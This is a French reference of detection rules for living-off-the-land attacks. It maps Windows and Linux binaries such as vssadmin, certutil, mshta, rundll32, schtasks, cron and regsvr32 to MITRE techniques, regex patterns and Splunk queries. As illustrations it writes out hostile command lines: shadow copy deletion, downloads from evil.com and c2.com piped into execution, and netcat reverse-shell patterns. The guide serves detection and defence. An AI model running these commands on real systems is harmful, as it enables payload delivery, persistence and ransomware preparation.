# Règles LOTL — Référence complète

## LOTL-001 — vssadmin Shadow Copy Deletion

| Attribut | Valeur |
|----------|--------|
| Image | `vssadmin.exe` |
| Tactic | Impact |
| Technique | T1490 — Inhibit System Recovery |
| Score | 0.92 |
| Confidence | 0.90 |

**Patterns détectés :**

```
delete\s+shadows        → vssadmin delete shadows /all /quiet
resize\s+shadowstorage  → vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
```

**Contexte :** La suppression des shadow copies est une étape systématique du ransomware avant le chiffrement. Elle empêche la récupération des fichiers via les points de restauration Windows.

**Action recommandée :** Isolation immédiate de la machine. Il s'agit d'un indicateur de pré-chiffrement — les fichiers ne sont peut-être pas encore chiffrés.

---

## LOTL-001b — vssadmin Reconnaissance

| Attribut | Valeur |
|----------|--------|
| Image | `vssadmin.exe` |
| Tactic | Discovery |
| Technique | T1082 — System Information Discovery |
| Score | 0.45 |

**Pattern :** `list\s+shadows` — énumération des shadow copies existantes avant leur suppression.

---

## LOTL-002 — WMIC Remote Process Creation

| Attribut | Valeur |
|----------|--------|
| Image | `wmic.exe` |
| Tactic | Lateral Movement |
| Technique | T1047 — Windows Management Instrumentation |
| Score | 0.80 |

**Patterns détectés :**

```
/node:                           → wmic /node:192.168.1.50 process call create ...
process\s+call\s+create          → wmic process call create "cmd.exe /c ..."
```

**Contexte :** WMI permet d'exécuter des commandes sur des machines distantes authentifiées. Utilisé pour le mouvement latéral sans déposer d'exécutable.

**Equivalence Splunk :**
```spl
index=sysmon EventCode=1 Image="*\\wmic.exe"
(CommandLine="*process call create*" OR CommandLine="*/node:*")
| stats count by host, user, CommandLine
```

---

## LOTL-003 — Mshta Remote/JS Script Execution

| Attribut | Valeur |
|----------|--------|
| Image | `mshta.exe` |
| Tactic | Execution |
| Technique | T1218.005 — System Binary Proxy: Mshta |
| Score | 0.85 |

**Patterns :**

```
https?://        → mshta.exe http://evil.com/payload.hta
javascript:      → mshta.exe javascript:a=GetObject("script:...")
vbscript:        → mshta.exe vbscript:Execute("...")
\.hta            → mshta.exe C:\Users\Public\malware.hta
```

**Contexte :** `mshta.exe` exécute des applications HTA (HTML Application) avec des privilèges élevés. Il peut charger des scripts depuis une URL distante, contournant les restrictions d'exécution PowerShell.

**Mitigation :** Bloquer `mshta.exe` via AppLocker ou WDAC. Le cas d'usage légitime de mshta avec une URL HTTP est inexistant dans la grande majorité des environnements d'entreprise.

---

## LOTL-004 — Certutil Download or Decode

| Attribut | Valeur |
|----------|--------|
| Image | `certutil.exe` |
| Tactic | Defense Evasion |
| Technique | T1140 — Deobfuscate/Decode Files or Information |
| Score | 0.82 |

**Patterns :**

```
-urlcache     → certutil -urlcache -f http://evil.com/payload.exe malware.exe
-decode       → certutil -decode encoded.b64 payload.exe
-encode       → certutil -encode legitimate.exe output.b64
-f https://   → certutil -f -urlcache -split https://...
```

**Contexte :** `certutil.exe` est un utilitaire de gestion de certificats qui supporte le téléchargement HTTP et le décodage base64. Son usage à ces fins est presque exclusivement malveillant.

**Equivalence Splunk :**
```spl
index=sysmon EventCode=1 Image="*\\certutil.exe"
(CommandLine="*-urlcache*" OR CommandLine="*-decode*" OR CommandLine="*-encode*")
| stats count by host, user, CommandLine
```

---

## LOTL-005 — Rundll32 Suspicious Execution

| Attribut | Valeur |
|----------|--------|
| Image | `rundll32.exe` |
| Tactic | Defense Evasion |
| Technique | T1218.011 — System Binary Proxy: Rundll32 |
| Score | 0.78 |

**Patterns :**

```
users\\public\\            → rundll32 C:\Users\Public\malware.dll,Entry
url\.dll,fileprotocolhandler → rundll32 url.dll,FileProtocolHandler http://evil.com
windows\\temp\\            → rundll32 C:\Windows\Temp\dropped.dll,Exec
javascript:               → rundll32 javascript:"\..\mshtml..."
```

**Contexte :** `rundll32.exe` charge et exécute des DLL. Il est utilisé pour charger des DLL malveillantes depuis des chemins non-système, ou pour déclencher des fonctionnalités obscures de l'OS.

---

## LOTL-006 — Scheduled Task via schtasks

| Attribut | Valeur |
|----------|--------|
| Image | `schtasks.exe` |
| Tactic | Persistence |
| Technique | T1053.005 — Scheduled Task/Job: Scheduled Task |
| Score | 0.75 |

**Patterns :**

```
/create                      → schtasks /Create /sc daily /tn Updater /tr payload.exe
/sc\s+(onlogon|onstart|...)  → déclenchement au démarrage/login
/tr\s+.*powershell           → tâche planifiée exécutant PowerShell
/tr\s+.*mshta                → tâche planifiée exécutant mshta
```

**Contexte :** Les tâches planifiées sont le mécanisme de persistance le plus utilisé après une compromission initiale. La combinaison `schtasks /Create + /tr PowerShell` est quasi-pathognomonique d'une backdoor.

**Complémentaire :** Voir aussi LOTL-006b (EventID 4698/4699/4702).

---

## LOTL-007 — Cron/at Suspicious Job (Linux/Unix)

| Attribut | Valeur |
|----------|--------|
| Image | `cron` |
| Tactic | Persistence |
| Technique | T1053.003 — Scheduled Task/Job: Cron |
| Score | 0.70 |

**Patterns :**

```
bash\s+-[ic]    → bash -c "curl http://c2.com/shell.sh | bash"
curl\s+.*\|     → téléchargement et exécution en pipe
wget\s+.*\|
python.*-c      → python -c "import os; os.system(...)"
nc\s+-          → netcat reverse shell
```

---

## LOTL-007b — at.exe (Legacy Windows)

| Attribut | Valeur |
|----------|--------|
| Image | `at.exe` |
| Tactic | Persistence |
| Technique | T1053.002 — Scheduled Task/Job: At |
| Score | 0.60 |

`at.exe` est déprécié depuis Windows 8. Tout usage d'`at.exe` dans un environnement moderne est anormal par nature.

---

## LOTL-008 — Regsvr32 Squiblydoo

| Attribut | Valeur |
|----------|--------|
| Image | `regsvr32.exe` |
| Tactic | Defense Evasion |
| Technique | T1218.010 — System Binary Proxy: Regsvr32 |
| Score | 0.88 |

**Patterns :**

```
/s\s+/n\s+/u\s+/i:http    → technique Squiblydoo classique
/i:https?://               → chargement de COM scriptlet distant
scrobj\.dll               → exécution de script COM via scrobj.dll
```

**Contexte :** La technique "Squiblydoo" utilise `regsvr32.exe` pour charger et exécuter un COM scriptlet distant (`.sct`) sans restriction AppLocker. C'est l'une des techniques LOTL les plus anciennes et toujours efficaces.
